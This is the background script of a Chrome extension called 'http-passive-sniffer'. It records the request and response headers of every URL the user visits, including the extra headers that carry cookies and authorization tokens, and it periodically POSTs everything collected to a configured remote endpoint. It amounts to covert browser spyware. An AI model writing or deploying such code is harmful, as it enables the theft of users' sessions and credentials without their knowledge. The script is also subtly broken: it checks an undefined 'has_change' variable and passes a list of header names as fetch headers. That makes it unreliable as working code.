let config = {
  has_change: false,
  post_url: 'some_post_url',
  method: 'POST',
  post_interval: 3000000,
  headers: [
    'initiator','method','requestHeaders',
    'responseHeaders', 'timeStamp','type',
    'url','extraHeaders', 'statusCode',
    'statusLine', 'ip', 'statusText'
  ]
}

let cache = {
  request: [],
  response:[]
}

const utils = {
  debounce(func, wait, immediate) {
    let timeout;
    return function() {
      let context = this,
      args = arguments,
      later = function() {
        timeout = null;
        if (!immediate) {
          func.apply(context, args);
        }
      }
      let callNow = immediate && !timeout;
      clearTimeout(timeout);
      timeout = setTimeout(later, wait);
      if(callNow){
        func.apply(context, args);
      }
    }
  }
}

chrome.runtime.onInstalled.addListener(function() {
 chrome.storage.local.set({request:[]}, function(res) {
   chrome.storage.local.set({response:[]}, function(res) {
     console.log('http-passive-sniffer installed')
   })
 })
});

window.addEventListener("store-data", utils.debounce(function(evt) {
  let dest = ['request', 'response'];

  for (let i = 0; i < dest.length; i++) {
    chrome.storage.local.get(function(res){
      res[dest[i]] = res[dest[i]].concat(cache[dest[i]]);
      chrome.storage.local.set(res);
      console.log(cache);
      cache[dest[i]] = [];
    })
  }

  config.has_change = true;

},3000));

// request
chrome.webRequest.onSendHeaders.addListener(function (headers){

  let obj = {},
  item = config.headers;

  for (let i = 0; i < item.length; i++) {
    if(headers[item[i]]){
      obj[item[i]] = headers[item[i]];
    }
  }

  cache.request.push(obj);

  window.dispatchEvent(new CustomEvent("store-data"));

}, {urls: ["<all_urls>"]}, ["requestHeaders", "extraHeaders"]);

// response
chrome.webRequest.onCompleted.addListener(function (headers){
  console.log(headers)
  let obj = {},
  item = config.headers;

  for (let i = 0; i < item.length; i++) {
    if(headers[item[i]]){
      obj[item[i]] = headers[item[i]];
    }
  }

  cache.response.push(obj);

  window.dispatchEvent(new CustomEvent("store-data"));

}, {urls: ["<all_urls>"]}, ["responseHeaders", "extraHeaders"]);

setInterval(function(){

  if(has_change){
    chrome.storage.local.get(function(res){

      fetch(config.post_url, {
        method: config.method,
        headers: config.headers,
        body: JSON.stringify(res)
      }).then(function(res){
        if (res.status >= 200 && res.status < 300) {
          return res.json();
        } else {
          return Promise.reject(new Error(res.statusText))
        }
      }).then(function(data){
        let dest = ['request', 'response'];

        for (let i = 0; i < dest.length; i++) {
          chrome.storage.local.get(function(res){
            res[dest[i]] = [];
            chrome.storage.local.set(res);
          })
        }
        has_change = false;

      }).catch(function(err){

      })

    })
  }

},config.post_interval)
